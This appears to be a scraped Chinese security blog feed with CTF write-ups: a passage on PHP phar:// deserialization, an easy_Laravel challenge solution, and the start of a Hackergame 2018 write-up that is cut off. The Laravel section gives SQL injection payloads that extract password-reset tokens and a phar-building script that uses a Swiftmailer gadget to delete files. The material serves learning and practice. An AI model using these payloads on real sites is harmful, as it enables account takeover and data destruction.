class="string">'O:4:"demo":1:&#123;s:7:"test_v1";s:9:"phpinfo()";&#125;'</span>;</span><br><span class="line">unserialize($s);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$demo2 = new demo();</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">serialize</span><br><span class="line">unserialize</span><br></pre></td></tr></table></figure><h3 id="0x03-phar文件通过phar-伪协议进行反序列化"><a href="#0x03-phar文件通过phar-伪协议进行反序列化" class="headerlink" title="0x03. phar文件通过phar://伪协议进行反序列化"></a>0x03. phar文件通过phar://伪协议进行反序列化</h3><blockquote><p>因为phar文件会以序列化的形式存储用户自定义的meta-data，所以在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作,深入了解请至：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></blockquote><table><thead><tr><th>受影响文件系统函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>假设file参数可控，传入<code>phar://demo.phar</code></p><p>demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $demo_v=<span class="string">'NULL'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;demo_v.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = <span class="string">'phar://demo.phar'</span>;</span><br><span class="line">    file_get_contents($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php脚本构造demo.phar利用以上代码的demo类输出其他字符串</p><p>payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $demo_v=<span class="string">'phpinfo()'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;demo_v.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"demo.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">    $obj = <span class="keyword">new</span> demo();</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行demo.php</p><p><img src="https://i.loli.net/2018/10/23/5bcee4a29c793.png" alt="r1.png"></p><h4 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h4><p>先是一个文件上传，在flag.php中有以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$recieve = $_GET[&apos;filename&apos;];</span><br><span class="line"></span><br><span class="line">class flag&#123;</span><br><span class="line">var $file;</span><br><span class="line">private $flag = &apos;****&apos;;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if ($this-&gt;file == &apos;phar&apos;)&#123;</span><br><span class="line">echo $this-&gt;flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_get_contents($recieve);</span><br></pre></td></tr></table></figure><p>本地生成phar文件伪装gif，再phar伪协议触发php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $file = <span class="string">'phar'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = serialize(<span class="keyword">new</span> flag());</span><br><span class="line">    var_dump($a);</span><br><span class="line">    $b = unserialize($a);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'./pp.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="string">'pp.phar'</span>, <span class="string">'pp.gif'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传访问<code>flag.php?filename=phar://upload_file/pp.gif</code>得到flag</p><p><code>D0g3{P_har_i3_uSef0l}</code></p><p>再如护网杯easy_Laravel一题也是利用phar反序列化</p><ul><li><p><strong>防范</strong></p><ul><li>检查文件内容</li><li>严格过滤文件函数参数</li></ul></li></ul><h3 id="0x04-参考link："><a href="#0x04-参考link：" class="headerlink" title="0x04. 参考link："></a>0x04. 参考link：</h3><p><a href="http://p0desta.com/2018/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://p0desta.com/2018/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</a></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;补充了一些内容&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP反序列化" scheme="http://j0k3r.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>护网杯之 easy_Laravel 反序列化分析</title>
    <link href="http://j0k3r.top/2018/10/22/easy_Laravel/"/>
    <id>http://j0k3r.top/2018/10/22/easy_Laravel/</id>
    <published>2018-10-21T16:00:00.000Z</published>
    <updated>2019-05-02T11:34:27.683Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><blockquote><p>护网杯又被锤爆，其他题目没截图什么的，也没写wp，easy_laravel感觉并不easy，没做出来，既然github上有docker，就跟着wp学习一下</p></blockquote><p>通过<code>https://github.com/qqqqqqvq/easy_laravel</code>链接下载源码</p><p>看到composer.json, 说明可以进行<code>composer install</code>安装项目的依赖，如果存在composer.phar文件，可使用<code>php composer.phar install</code>安装</p><p><img src="https://i.loli.net/2018/10/20/5bcb0f4057373.png" alt="e4.png"></p><p>之后会出现一个vendor文件夹</p><p>首先查看路由，分析操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&apos;/&apos;, function () &#123; return view(&apos;welcome&apos;); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(&apos;/home&apos;, &apos;HomeController@index&apos;);</span><br><span class="line">Route::get(&apos;/note&apos;, &apos;NoteController@index&apos;)-&gt;name(&apos;note&apos;);</span><br><span class="line">Route::get(&apos;/upload&apos;, &apos;UploadController@index&apos;)-&gt;name(&apos;upload&apos;);</span><br><span class="line">Route::post(&apos;/upload&apos;, &apos;UploadController@upload&apos;)-&gt;name(&apos;upload&apos;);</span><br><span class="line">Route::get(&apos;/flag&apos;, &apos;FlagController@showFlag&apos;)-&gt;name(&apos;flag&apos;);</span><br><span class="line">Route::get(&apos;/files&apos;, &apos;UploadController@files&apos;)-&gt;name(&apos;files&apos;);</span><br><span class="line">Route::post(&apos;/check&apos;, &apos;UploadController@check&apos;)-&gt;name(&apos;check&apos;);</span><br><span class="line">Route::get(&apos;/error&apos;, &apos;HomeController@error&apos;)-&gt;name(&apos;error&apos;);</span><br></pre></td></tr></table></figure><p><code>Auth::routes()</code>路由是 Laravel 默认提供的一套关于用户系统的脚手架，能推测出开发的操作是<code>php artisan make:auth</code></p><p>非admin只能访问note页面</p><p>由注册控制器找到ModelFactory.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\User::class, function (Faker\Generator $faker) &#123;</span><br><span class="line">    static $password;</span><br><span class="line"></span><br><span class="line">    return [</span><br><span class="line">        &apos;name&apos; =&gt; &apos;4uuu Nya&apos;,</span><br><span class="line">        &apos;email&apos; =&gt; &apos;admin@qvq.im&apos;,</span><br><span class="line">        &apos;password&apos; =&gt; bcrypt(str_random(40)),</span><br><span class="line">        &apos;remember_token&apos; =&gt; str_random(10),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>40位随机字符串作为admin密码，无法暴力破解</p><p>找到note页面的控制器</p><p><code>/app/Http/Controllers/NoteController.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function index(Note $note)</span><br><span class="line">&#123;</span><br><span class="line">    $username = Auth::user()-&gt;name;</span><br><span class="line">    $notes = DB::select(&quot;SELECT * FROM `notes` WHERE `author`=&apos;&#123;$username&#125;&apos;&quot;);</span><br><span class="line">    return view(&apos;note&apos;, compact(&apos;notes&apos;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中存在明显注入点，利用username</p><p>sql语句变为</p><p><code>SELECT * FROM `notes` WHERE `author`=&#39;admin&#39; or 1=1#&#39;</code></p><p>正常note页面无任何信息，登陆<code>admin&#39; or 1=1#</code>查看note页面</p><p>返回</p><p><code>nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的</code></p><p>接着可以进行一些注入</p><p><code>&#39; union select 1,(group_concat(table_name) from information_schema.tables where table_schema=0x687762),3,4,5#</code></p><p><code>&#39; union select 1,(select token from password_resets),3,4,5#</code></p><p>然而admin的密码难以解密，既然知道邮箱，看能否重置密码</p><p>在/vendor/laravel/framework/src/Illuminate\Auth\Passwords\ PasswordBroker.php中发送重置链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function sendResetLink(array $credentials)</span><br><span class="line">&#123;</span><br><span class="line">    $user = $this-&gt;getUser($credentials);</span><br><span class="line"></span><br><span class="line">    if (is_null($user)) &#123;</span><br><span class="line">        return static::INVALID_USER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $user-&gt;sendPasswordResetNotification(</span><br><span class="line">        $this-&gt;tokens-&gt;create($user)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    return static::RESET_LINK_SENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相邻的DatabaseTokenRepository.php中生成一个新token，create方法中把token写入了数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function create(CanResetPasswordContract $user)</span><br><span class="line">&#123;</span><br><span class="line">    $email = $user-&gt;getEmailForPasswordReset();</span><br><span class="line"></span><br><span class="line">    $this-&gt;deleteExisting($user);</span><br><span class="line"></span><br><span class="line">    $token = $this-&gt;createNewToken();</span><br><span class="line"></span><br><span class="line">    $this-&gt;getTable()-&gt;insert($this-&gt;getPayload($email, $token));</span><br><span class="line"></span><br><span class="line">    return $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function createNewToken()</span><br><span class="line">&#123;</span><br><span class="line">    return hash_hmac(&apos;sha256&apos;, Str::random(40), $this-&gt;hashKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected function getPayload($email, $token)</span><br><span class="line">&#123;</span><br><span class="line">    return [&apos;email&apos; =&gt; $email, &apos;token&apos; =&gt; $token, &apos;created_at&apos; =&gt; new Carbon];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入</p><p>从composer.json能看出laravel版本低于5.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.4&quot;,</span><br><span class="line">    &quot;laravel/framework&quot;: &quot;5.3.*&quot;,</span><br><span class="line">    &quot;laracasts/flash&quot;: &quot;^2.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>利用sql注入获取token</p><p>/database/migrations/2014_10_12_100000_create_password_resets_table.php中创建的password_resets表中含token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function up()</span><br><span class="line">&#123;</span><br><span class="line">    Schema::create(&apos;password_resets&apos;, function (Blueprint $table) &#123;</span><br><span class="line">        $table-&gt;string(&apos;email&apos;)-&gt;index();</span><br><span class="line">        $table-&gt;string(&apos;token&apos;)-&gt;index();</span><br><span class="line">        $table-&gt;timestamp(&apos;created_at&apos;)-&gt;nullable();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入获得token</p><p><code>&#39; union select 1,(select token from password_resets limit 1,2),3,4,5#</code></p><p><img src="https://i.loli.net/2018/10/20/5bcb4a5315022.png" alt="e6.png"></p><p>访问<code>http://127.0.0.1:7777/password/reset/7c80f08e9cccfd8e149506b6c35223574eacfbe305b0c92ae8c7400fe1cd6f7b</code></p><p>登陆admin账号</p><p><img src="https://i.loli.net/2018/10/20/5bcb468b472d6.png" alt="e3.png"></p><p>按照FlagController.php的代码，应该是直接打印flag的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function showFlag()</span><br><span class="line">&#123;</span><br><span class="line">    $flag = file_get_contents(&apos;/th1s1s_F14g_2333333&apos;);</span><br><span class="line">    return view(&apos;auth.flag&apos;)-&gt;with(&apos;flag&apos;, $flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是并得不到flag,页面提示 no flag</p><blockquote><p>这里页面内容不一致，在 laravel 中，模板文件是存放在 resources/views 中的，然后会被编译放到 storage/framework/views 中，而编译后的文件存在<strong>过期</strong>的判断</p></blockquote><p>即需要删除flag的模版缓存，同时在上传控制器中，path与filename参数完全可控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   public function files()</span><br><span class="line">    &#123;</span><br><span class="line">        $files = array_except(Storage::allFiles(&apos;public&apos;), [&apos;0&apos;]);</span><br><span class="line">        return view(&apos;files&apos;)-&gt;with(&apos;files&apos;, $files);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function check(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">        $path = $request-&gt;input(&apos;path&apos;, $this-&gt;path);</span><br><span class="line">        $filename = $request-&gt;input(&apos;filename&apos;, null);</span><br><span class="line">        if($filename)&#123;</span><br><span class="line">            if(!file_exists($path . $filename))&#123;</span><br><span class="line">                Flash::error(&apos;磁盘文件已删除，刷新文件列表&apos;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                Flash::success(&apos;文件有效&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return redirect(route(&apos;files&apos;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能通过file_exists使用phar://协议触发反序列化</p><blockquote><p><a href="https://xz.aliyun.com/t/2715#toc-14" target="_blank" rel="noopener">file_exist的使用</a></p></blockquote><p>这里需要知道phar协议在涉及到文件操作的时候存在反序列化，所以可以利用反序列化删除模板缓存，而admin可以上传文件</p><ul><li>利用 phar 拓展 php 反序列化漏洞攻击面<br>:<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></li></ul><ul><li><p>魔术方法：<code>__destruct</code></p><ul><li>销毁对象的时候会自动调用该方法</li></ul></li></ul><p>全局搜索<code>__destruct</code></p><p><img src="https://i.loli.net/2018/10/21/5bcc8aac0ee51.png" alt="e7.png"></p><p>找到一个unlink函数用来删除文件</p><p>是个位于TemporaryFileByteStream.php中的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $filePath = tempnam(sys_get_temp_dir(), &apos;FileByteStream&apos;);</span><br><span class="line"></span><br><span class="line">        if ($filePath === false) &#123;</span><br><span class="line">            throw new Swift_IoException(&apos;Failed to retrieve temporary file name.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent::__construct($filePath, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getContent()</span><br><span class="line">    &#123;</span><br><span class="line">        if (($content = file_get_contents($this-&gt;getPath())) === false) &#123;</span><br><span class="line">            throw new Swift_IoException(&apos;Failed to get temporary file content.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (file_exists($this-&gt;getPath())) &#123;</span><br><span class="line">            @unlink($this-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在要找到缓存文件，<code>/usr/share/nginx/html</code>是nginx默认路径，模板文件在<code>resources/views/</code>里，接着本地在auth文件夹里看到一个flag.blade.php</p><p>在Illuminate/View/Compilers/Compiler.php中得知缓存文件名为模版文件路径的sha1，即34e41df0934a75437873264cd28e2d835bc38772.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getCompiledPath($path)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;cachePath.&apos;/&apos;.sha1($path).&apos;.php&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着生成供反序列化的phar文件</p><p>参考了好几个大佬的payload，根据本地文件修改了下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include(&apos;vendor/autoload.php&apos;);</span><br><span class="line">    $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line">    //var_dump(unserialize($a));</span><br><span class="line">    //var_dump($a);</span><br><span class="line">    $a = preg_replace(&quot;/\/private\/var\/folders\/v4\/wl2fggss4x76q3_m97bjsw780000gn\/T\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&quot;,&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a);</span><br><span class="line">    var_dump($a);</span><br><span class="line">    $a = str_replace(&apos;s:77&apos;, &apos;s:90&apos;, $a);</span><br><span class="line">    $b = unserialize($a);</span><br><span class="line">    $p = new Phar(&apos;./3.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(&apos;test.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(&apos;3.phar&apos;, &apos;3.gif&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>注：php.ini中的phar.readonly项设置为Off或0才能生成phar文件</strong></p><p>生成phar文件后改图片后缀上传，抓包传入path和filename</p><p><img src="https://i.loli.net/2018/10/22/5bcdebb43792e.png" alt="e9.png"></p><p>访问flag即可</p><p><img src="https://i.loli.net/2018/10/22/5bcdebb445713.png" alt="e8.png"></p><p>参考：</p><p>出题人题解：<br><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="noopener">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://xz.aliyun.com/t/2901" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901</a></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p><a href="http://p0desta.com/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AFeasy_laravel&amp;pwnhub%E5%92%95%E5%92%95%E5%95%86%E5%BA%97/" target="_blank" rel="noopener">http://p0desta.com/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AFeasy_laravel&amp;pwnhub%E5%92%95%E5%92%95%E5%95%86%E5%BA%97/</a></p><p><a href="https://xz.aliyun.com/t/2715#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-14</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame 2018 (中国科学技术大学第五届信息安全大赛) WriteUp</title>
    <link href="http://j0k3r.top/2018/10/16/Hackergame_2018/"/>
    <id>http://j0k3r.top/2018/10/16/Hackergame_2018/</id>
    <published>2018-10-15T16:00:00.000Z</published>
    <updated>2019-04-22T11:53:06.434Z</updated>
    
    <content type="html"><![CDATA[<p>前两题不写了。。</p><a id="more"></a><h3 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h3><p>ps拼接一堆图片,得到flag</p><p><img src="https://i.loli.net/2018/10/14/5bc339a454170.png" alt="1.png"></p><h3 id="猫咪和键盘"><a href="#猫咪和键盘" class="headerlink" title="猫咪和键盘"></a>猫咪和键盘</h3><p>恢复得到的混乱的c++代码，有明显的规律，运行即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++17 typed_printf2.cpp -o type</span><br><span class="line">./type</span><br><span class="line">flag&#123;FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125typed_printf95&#125;%</span><br></pre></td></tr></table></figure><h3 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h3><p><code>binwalk -e</code>分析下载的docx文件，并解压</p><p>得到flag.txt文本</p><p><code>flag{xlsx,pptx,docx_are_just_zip_files}</code></p><h3 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h3><p> 通过输入较大时间值来实现溢出</p><p> <img src="https://i.loli.net/2018/10/14/5bc32b9c2ca00.png" alt="5.png"></p><p><img src="https://i.loli.net/2018/10/14/5bc32b9c7ca3b.png" alt="6.png"></p><p>兑换flag</p><p> <code>flag{Evil_Integer._Evil_Overflow.}</code></p><h3 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h3><p>提示：请使用最新版黑曜石浏览器（HEICORE）打开。</p><p>出题人还弄了个像样官网。。。</p><p>google 找到官网<br><code>view-source:https://heicore.com/index.html</code>得到有一大段js的源码，其中有ua, 特别的是<code>.html</code>非<code>.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var HEICORE_UA = &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36&quot;;</span><br></pre></td></tr></table></figure><p>替换ua得到flag</p><p><code>flag{H3ic0re_49.1.2623.213_sai_kou}</code></p><h3 id="回到过去"><a href="#回到过去" class="headerlink" 